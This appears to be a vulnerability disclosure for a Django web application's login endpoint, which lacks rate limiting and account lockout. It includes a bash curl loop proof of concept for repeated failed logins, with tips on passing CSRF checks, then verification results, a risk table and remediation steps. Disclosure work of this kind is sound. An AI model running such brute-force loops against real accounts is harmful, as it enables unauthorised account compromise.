# Description

Missing restriction of excessive authentication attempts (CWE-307) in the login flow (`Account/views.py:570-609`), exposing accounts to unlimited brute-force and credential-stuffing attacks: there is no rate limit, no progressive delay and no account lockout.

The `login_view()` function records every attempt in `LoginHistory` (`Account/models.py:207-271`), but nothing reads those entries to slow down or block further attempts.

The application also implements dedicated rate limiting for password reset requests (`Account/models.py:442-485`), but it is only used by the reset flow. The reverse proxy adds no protection either: `docker-compose.yml:144-153` disables BunkerWeb's anti-abuse plugins (`USE_BAD_BEHAVIOR`, `USE_ANTIBOT`, `USE_LIMIT_REQ`, `USE_LIMIT_CONN` = `"no"`) and runs the WAF in `SECURITY_MODE: "detect"`.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Fetch `/account/login/` once to get a CSRF cookie and token. | The same token is accepted for every following attempt. |
| 2 | Send many failed logins for a target user. | Every attempt returns HTTP 200 "Invalid credentials" in about 0.6 s, with no increasing delay. |
| 3 | Log in with the correct password right after the failures. | `302 → /account/process/`: the account is not locked. |

# PoC

```bash
# First, obtain a CSRF token from the login page.
# The page contains two csrfmiddlewaretoken inputs: keep only the first one.
CSRF=$(curl -s -c cookies.txt https://<TARGET>/account/login/ \
  | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code} in %{time_total}s\n" \
    -b cookies.txt -X POST https://<TARGET>/account/login/ \
    -H "Referer: https://<TARGET>/account/login/" \
    -d "csrfmiddlewaretoken=${CSRF}&username=<target_user>&password=wrongpass$i"
done
# Attempt 1: HTTP 200 in 0.59s
# ...
# Attempt 10: HTTP 200 in 0.61s
```

Two details matter for the PoC to reach the authentication code:
- Without `| head -1`, `grep` returns both tokens joined by a newline and Django rejects every attempt with `403 CSRF verification failed`.
- Over HTTPS, Django's CSRF check also requires a same-origin `Referer` header (403 without it). Over plain HTTP the header is not needed.

Verified on a throwaway account, directly against Django and through the BunkerWeb reverse proxy (HTTP and HTTPS):
- 10 wrong passwords returned `HTTP 200` with the "Invalid credentials" message, each in 0.58–0.91 s with no progressive delay.
- The correct password, sent with the same CSRF token immediately afterwards, returned `302 → /account/process/`: no lockout.
- `LoginHistory` recorded `failed: 10, success: 1`; nothing acted on those entries.
- No ModSecurity/CRS rule fired on the login requests and BunkerWeb applied no limit or ban.

Django's `CsrfViewMiddleware` is configured in `djangoWocshack_5/settings/base.py:70`. CSRF protection and authentication rate limiting address distinct security concerns: a single token is enough for an unlimited run of attempts.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Account compromise through unlimited brute-force or credential-stuffing attempts. |
| Integrity | Potential banking and API-key abuse following account compromise. |
| Availability | None directly. |

Overall severity: **Medium** — strong enabler when combined with the username-enumeration oracle and leaked/reused passwords.

# Remediation

1. **Rate-limit** login (e.g. 5 attempts / 15 min per IP and per account).
2. **Progressive lockout / exponential backoff** after consecutive failures, while avoiding denial of service against legitimate users.
3. **CAPTCHA** after a small number of failures.
4. **Integrate authentication rate limiting with the existing `LoginHistory` audit mechanism** and monitor excessive authentication failures.
5. **Add regression tests** to verify the effectiveness of authentication rate limiting.

# Author
0xE51EE
